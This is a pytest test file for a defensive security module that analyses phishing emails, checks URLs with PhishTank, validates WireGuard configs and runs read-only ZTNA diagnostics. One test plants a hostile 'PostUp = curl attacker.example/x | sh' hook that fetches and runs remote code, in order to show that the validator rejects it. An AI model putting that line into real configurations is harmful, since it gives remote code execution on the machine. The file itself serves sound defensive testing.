from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from chainlog.advanced_security import (
    AdvancedSecurityError,
    analyze_email,
    build_microsegmentation_plan,
    check_phishtank_url,
    extract_urls,
    inspect_ztna_tools,
    run_spamassassin,
    validate_wireguard_config,
)


def test_email_local_analysis_detects_failed_auth_and_reply_mismatch():
    raw = """From: Direksi <security@trusted.example>
Reply-To: agent@lookalike.example
Authentication-Results: mx; spf=fail; dkim=fail; dmarc=fail
Subject: Urgent action - verify your account
Content-Type: text/plain; charset=utf-8

Segera verifikasi akun: http://xn--bad-0qa.example/login
"""
    result = analyze_email(raw)
    assert result["score"] >= 50
    assert result["verdict"] == "TINGGI"
    assert any(x["code"] == "REPLY_TO_DOMAIN_MISMATCH" for x in result["findings"])
    assert any(x["code"].startswith("AUTH_") for x in result["findings"])
    assert result["automatic_delete"] is False


def test_email_clean_message_does_not_claim_safe():
    result = analyze_email("From: User <user@example.test>\nSubject: Meeting\n\nSee https://intranet.example.test/")
    assert result["score"] < 50
    assert "jaminan" not in " ".join(x["message"] for x in result["findings"]).lower() or result["analysis_mode"] == "offline_heuristic"
    assert result["automatic_delete"] is False


def test_email_rejects_empty_and_oversized():
    with pytest.raises(AdvancedSecurityError):
        analyze_email("   ")
    with pytest.raises(AdvancedSecurityError):
        analyze_email("X: y\n\n" + "a" * (512 * 1024))


def test_url_extraction_deduplicates_and_bounds():
    text = "https://example.com/a https://example.com/a http://short.test/a"
    assert extract_urls(text) == ["https://example.com/a", "http://short.test/a"]
    assert len(extract_urls(" ".join(f"https://h{i}.example/path" for i in range(140)))) == 100


def test_phishtank_requires_key_and_rejects_local_url_before_network():
    with pytest.raises(AdvancedSecurityError, match="API key"):
        check_phishtank_url("https://example.com", "")
    with pytest.raises(AdvancedSecurityError, match="nonpublik"):
        check_phishtank_url("http://127.0.0.1/admin", "some-test-key")
    with pytest.raises(AdvancedSecurityError, match="kredensial"):
        check_phishtank_url("https://user:pass@example.com", "some-test-key")
    with pytest.raises(AdvancedSecurityError, match="Domain lokal/test"):
        check_phishtank_url("https://mail.internal.test/path", "some-test-key")


def test_spamassassin_absent_is_graceful(monkeypatch):
    monkeypatch.setattr("chainlog.advanced_security.shutil.which", lambda _: None)
    result = run_spamassassin("From: a@example.test\n\nmessage")
    assert result["available"] is False
    assert result["automatic_delete"] is False


def test_microsegmentation_preview_valid_and_never_applies():
    plan = build_microsegmentation_plan(
        "10.10.10.0/24", "10.10.20.0/24", "10.10.30.0/24", "10.10.40.0/24"
    )
    assert plan["mode"] == "PREVIEW_ONLY"
    assert plan["requires_operator_review"] is True
    assert len(plan["rules"]) == 6
    assert any(rule["action"] == "deny" for rule in plan["rules"])


@pytest.mark.parametrize("args", [
    ("bad", "10.10.20.0/24", "10.10.30.0/24", "10.10.40.0/24"),
    ("10.10.10.0/24", "10.10.10.0/24", "10.10.30.0/24", "10.10.40.0/24"),
    ("8.8.8.0/24", "10.10.20.0/24", "10.10.30.0/24", "10.10.40.0/24"),
])
def test_microsegmentation_rejects_invalid_or_public_or_overlapping_zones(args):
    with pytest.raises(AdvancedSecurityError):
        build_microsegmentation_plan(*args)


def test_wireguard_validation_never_returns_private_key():
    cfg = """[Interface]
PrivateKey = AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8=
Address = 10.0.0.2/32

[Peer]
PublicKey = AQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyA=
Endpoint = vpn.example.test:51820
AllowedIPs = 10.0.0.0/24
"""
    result = validate_wireguard_config(cfg)
    assert result["valid"] is True
    assert result["private_key_present"] is True
    assert result["private_key_value_returned"] is False
    assert "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8=" not in json.dumps(result)


def test_wireguard_validation_rejects_missing_peer():
    with pytest.raises(AdvancedSecurityError):
        validate_wireguard_config("[Interface]\nPrivateKey = abc\nAddress = 10.0.0.2/32\n")


def test_ztna_check_is_read_only_and_returns_guidance():
    result = inspect_ztna_tools()
    assert "OpenZiti Edge Tunnel" in result["available"]
    assert "OpenZiti CLI" in result["available"]
    assert "WireGuard Tools" in result["available"]
    assert "WireGuard Userspace" in result["available"]
    assert "OpenZiti Edge Tunnel" in result["versions"]
    assert result["controller_status"]["status"] == "not_checked"
    assert result["no_auto_apply"] is True
    assert "firewall" in result["dark_ip_note"].lower()


def test_ztna_diagnostics_run_only_fixed_read_only_commands(monkeypatch):
    from types import SimpleNamespace

    calls = []
    paths = {
        "ziti-edge-tunnel": "/usr/bin/ziti-edge-tunnel",
        "ziti": "/usr/bin/ziti",
        "wg": "/usr/bin/wg",
        "wireguard-go": "/usr/bin/wireguard-go",
        "systemctl": "/usr/bin/systemctl",
    }
    monkeypatch.setattr("chainlog.advanced_security.shutil.which", lambda name: paths.get(name))

    def fake_run(args, **kwargs):
        calls.append((args, kwargs))
        if args[-2:] == ["show", "interfaces"]:
            return SimpleNamespace(returncode=0, stdout="wg0\n", stderr="")
        if args[-2:] == ["is-active", "ziti-edge-tunnel.service"]:
            return SimpleNamespace(returncode=0, stdout="active\n", stderr="")
        return SimpleNamespace(returncode=0, stdout="version 1.2.3\n", stderr="")

    monkeypatch.setattr("chainlog.advanced_security.subprocess.run", fake_run)
    result = inspect_ztna_tools()
    assert result["edge_runtime"]["status"] == "ok"
    assert result["edge_service"]["status"] == "ok"
    assert result["wireguard_runtime"]["status"] == "active"
    assert result["controller_status"]["status"] == "not_checked"
    assert all(call_kwargs["shell"] is False for _, call_kwargs in calls)
    assert all(call_kwargs["timeout"] <= 3.0 for _, call_kwargs in calls)
    assert all("enroll" not in args and "delete" not in args for args, _ in calls)


def test_wireguard_validation_supports_multiple_peers_and_rejects_shell_hooks():
    key1 = "AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE="
    key2 = "AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI="
    private = "AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM="
    cfg = f"""[Interface]
PrivateKey = {private}
Address = 10.0.0.2/32

[Peer]
PublicKey = {key1}
AllowedIPs = 10.0.0.0/24

[Peer]
PublicKey = {key2}
Endpoint = peer.example.test:51820
AllowedIPs = 10.1.0.0/24
"""
    assert validate_wireguard_config(cfg)["peer_count"] == 2
    with pytest.raises(AdvancedSecurityError, match="hook shell"):
        validate_wireguard_config(cfg.replace("Address = 10.0.0.2/32", "Address = 10.0.0.2/32\nPostUp = curl attacker.example/x | sh"))


def test_phishtank_selected_url_lookup_parses_result_without_uploading_email(monkeypatch):
    import httpx

    submitted = {}

    class FakeResponse:
        status_code = 200

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

        def iter_bytes(self):
            yield b'{"results":{"url":"https://bad.example.com/login","in_database":"true","verified":"true","valid":"true"}}'

    class FakeClient:
        def __init__(self, **kwargs):
            assert kwargs["verify"] is True
            assert kwargs["follow_redirects"] is False

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

        def stream(self, method, url, *, data, headers):
            submitted["method"] = method
            submitted["url"] = url
            submitted["data"] = data
            submitted["headers"] = headers
            return FakeResponse()

    monkeypatch.setattr(httpx, "Client", FakeClient)
    result = check_phishtank_url("https://bad.example.com/login", "test-app-key")
    assert result["is_confirmed_phish"] is True
    assert submitted["method"] == "POST"
    assert submitted["data"]["url"] == "https://bad.example.com/login"
    assert "email" not in submitted["data"]
    assert "test-app-key" not in json.dumps(result)


def test_phishtank_rejects_invalid_port_before_network():
    with pytest.raises(AdvancedSecurityError):
        check_phishtank_url("https://example.com:99999", "test-app-key")
